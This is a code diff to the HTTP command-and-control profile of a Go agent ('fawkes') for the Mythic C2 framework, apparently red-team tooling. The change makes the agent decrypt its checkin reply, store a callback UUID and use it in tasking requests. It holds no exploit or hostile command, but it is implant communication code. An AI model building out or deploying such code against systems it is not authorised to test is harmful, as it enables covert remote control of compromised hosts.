@@ -30,6 +30,7 @@ type HTTPProfile struct {
 	Debug         bool
 	Endpoint      string
 	client        *http.Client
+	CallbackUUID  string // Store callback UUID from initial checkin
 }
 
 // NewHTTPProfile creates a new HTTP profile
@@ -109,9 +110,58 @@ func (h *HTTPProfile) Checkin(agent *structs.Agent) error {
 		return fmt.Errorf("checkin failed with status: %d", resp.StatusCode)
 	}
 
+	// Read and process the checkin response to extract callback UUID
+	respBody, err := io.ReadAll(resp.Body)
+	if err != nil {
+		return fmt.Errorf("failed to read checkin response: %w", err)
+	}
+
 	if h.Debug {
-		respBody, _ := io.ReadAll(resp.Body)
-		log.Printf("[DEBUG] Checkin response: %s", string(respBody))
+		log.Printf("[DEBUG] Checkin response body: %s", string(respBody))
+	}
+
+	// Decrypt the checkin response if needed
+	var decryptedResponse []byte
+	if h.EncryptionKey != "" {
+		// Base64 decode the response
+		decodedData, err := base64.StdEncoding.DecodeString(string(respBody))
+		if err != nil {
+			log.Printf("[DEBUG] Failed to decode checkin response: %v", err)
+			return fmt.Errorf("failed to decode checkin response: %w", err)
+		}
+		
+		// Decrypt the response
+		decryptedResponse, err = h.decryptResponse(decodedData)
+		if err != nil {
+			log.Printf("[DEBUG] Failed to decrypt checkin response: %v", err)
+			return fmt.Errorf("failed to decrypt checkin response: %w", err)
+		}
+	} else {
+		decryptedResponse = respBody
+	}
+
+	// Parse the response to extract callback UUID
+	var checkinResponse map[string]interface{}
+	if err := json.Unmarshal(decryptedResponse, &checkinResponse); err != nil {
+		log.Printf("[DEBUG] Failed to parse checkin response as JSON: %v", err)
+		log.Printf("[DEBUG] Decrypted response: %s", string(decryptedResponse))
+		return fmt.Errorf("failed to parse checkin response: %w", err)
+	}
+
+	// Extract callback UUID (commonly called 'id' or 'uuid' in response)
+	if callbackID, exists := checkinResponse["id"]; exists {
+		if callbackStr, ok := callbackID.(string); ok {
+			h.CallbackUUID = callbackStr
+			log.Printf("[INFO] Received callback UUID: %s", h.CallbackUUID)
+		}
+	} else if callbackUUID, exists := checkinResponse["uuid"]; exists {
+		if callbackStr, ok := callbackUUID.(string); ok {
+			h.CallbackUUID = callbackStr
+			log.Printf("[INFO] Received callback UUID: %s", h.CallbackUUID)
+		}
+	} else {
+		log.Printf("[WARNING] No callback UUID found in checkin response, using payload UUID")
+		h.CallbackUUID = agent.PayloadUUID
 	}
 
 	return nil
@@ -127,7 +177,7 @@ func (h *HTTPProfile) GetTasking(agent *structs.Agent) ([]structs.Task, error) {
 		Action:      "get_tasking",
 		TaskingSize: 1, // Request one task at a time for now
 		// Include agent identification for checkin updates
-		PayloadUUID: agent.PayloadUUID,
+		PayloadUUID: h.getActiveUUID(agent), // Use callback UUID if available
 		PayloadType: "fawkes",
 		C2Profile:   "http",
 	}
@@ -146,7 +196,8 @@ func (h *HTTPProfile) GetTasking(agent *structs.Agent) ([]structs.Task, error) {
 	}
 
 	// Send using Freyja-style format: UUID + JSON, then base64 encode
-	messageData := append([]byte(agent.PayloadUUID), body...)
+	activeUUID := h.getActiveUUID(agent)
+	messageData := append([]byte(activeUUID), body...)
 	encodedData := base64.StdEncoding.EncodeToString(messageData)
 
 	resp, err := h.makeRequest("POST", h.Endpoint, []byte(encodedData))
@@ -333,6 +384,17 @@ func (h *HTTPProfile) decryptResponse(encryptedData []byte) ([]byte, error) {
 	}
 
 	return plaintext[:len(plaintext)-padding], nil
+}
+
+// getActiveUUID returns the callback UUID if available, otherwise the payload UUID
+// getActiveUUID returns the callback UUID if available, otherwise the payload UUID
+func (h *HTTPProfile) getActiveUUID(agent *structs.Agent) string {
+	if h.CallbackUUID != "" {
+		log.Printf("[DEBUG] Using callback UUID: %s", h.CallbackUUID)
+		return h.CallbackUUID
+	}
+	log.Printf("[DEBUG] Using payload UUID: %s", agent.PayloadUUID)
+	return agent.PayloadUUID
 }
 
 // PostResponse sends a response back to Mythic
